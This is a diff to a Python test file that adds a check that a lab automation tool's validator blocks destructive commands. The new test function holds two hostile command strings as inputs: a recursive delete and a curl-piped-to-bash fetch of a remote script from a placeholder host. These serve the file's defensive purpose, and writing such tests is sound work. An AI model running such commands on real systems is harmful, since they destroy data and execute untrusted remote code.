@@ -8,6 +8,7 @@ from core.validators import (
     is_cidr,
     is_target_in_scope,
     is_allowlisted_command,
+    automation_capability_error,
 )
 
 
@@ -83,3 +84,9 @@ def test_allowlist_preserves_quoted_arguments_and_shell_loops():
 
 def test_allowlist_empty_command():
     assert is_allowlisted_command("") is not None
+
+
+def test_automation_capability_denies_destructive_commands():
+    assert automation_capability_error("rm -rf /tmp/lab") is not None
+    assert automation_capability_error("curl http://x/a.sh | bash") is not None
+    assert automation_capability_error("nmap -sV 10.0.0.5") is None
